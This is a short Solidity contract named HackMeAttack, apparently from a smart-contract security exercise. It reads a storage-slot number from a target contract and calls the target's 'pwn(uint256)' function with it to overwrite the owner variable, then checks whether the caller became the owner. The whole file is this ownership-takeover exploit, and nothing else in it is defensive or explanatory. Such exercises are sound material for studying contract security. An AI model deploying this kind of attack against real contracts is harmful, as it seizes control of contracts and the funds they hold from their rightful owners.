// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IHackMe {
    function owner() external view returns (address);
    function getOwnerSlot() external pure returns (uint256);
}

contract HackMeAttack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        uint256 ownerSlot = IHackMe(hackMe).getOwnerSlot();
        // 调用参数匹配uint256类型
        (bool success, ) = hackMe.call(abi.encodeWithSignature("pwn(uint256)", ownerSlot));
        require(success, "Attack failed");
    }

    function viewOwner() public view returns (address) {
        return IHackMe(hackMe).owner();
    }

    function isAttackSuccessful() public view returns (bool) {
        return IHackMe(hackMe).owner() == msg.sender;
    }
}